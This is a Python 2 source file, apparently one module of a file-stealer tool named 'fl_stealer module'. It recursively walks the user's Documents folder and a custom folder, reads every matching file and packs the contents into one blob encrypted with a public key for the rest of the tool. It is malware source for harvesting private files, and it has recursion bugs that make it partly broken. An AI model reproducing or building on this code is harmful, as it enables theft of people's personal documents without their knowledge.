# -*- coding: utf-8 -*-
# from gi.repository import GLib
# downloads_dir = GLib.get_user_special_dir(GLib.UserDirectory.DIRECTORY_DOWNLOAD)
import os
import common
import re

custom_paths = ["/home/pawel/custom_folder"]
special_paths = ["DOC"]
files_to_find = [".*"]
module_name = "fl_stealer module"
pub_key_size = 16

def update_result(root, dirs, files, result):
    result += "[*] {0}\n".format(root)
    for file in files:
        result += "\t--> {0}\n".format(file)
    for dir in dirs:
        for sub_root, sub_dirs, sub_files in os.walk(root + dir):
            result += update_result(sub_root, sub_dirs, sub_files)
    return result


def get_pattern():
    return "|".join(files_to_find)


def save_files(root, dirs, files, result):
    pattern = get_pattern()
    for file in files:
        if  re.search(pattern, file) is not None:
            print "[*] Fetching {0} ..".format(file)
            with open("{0}/{1}".format(root,file), "rb") as content_file:
                result += "{0}/{1}\n{2}{3}".format(root, file, content_file.read(), common.fill_line())
            print "[*] Fetched!"
    for dir in dirs:
        for sub_root, sub_dirs, sub_files in os.walk(root + dir):
            result += save_files(sub_root, sub_dirs, sub_files, result)
    return result


def save_file_data():
    result = common.fill_line()
    for path in common.get_paths(custom_paths, special_paths):
        for root, dirs, files in os.walk(path):
            result = save_files(root, dirs, files, result)
    return common.get_module_info(module_name), common.encrypt_file_content_with_public_key(result, pub_key_size)


#application
def run(*args):
    return save_file_data()




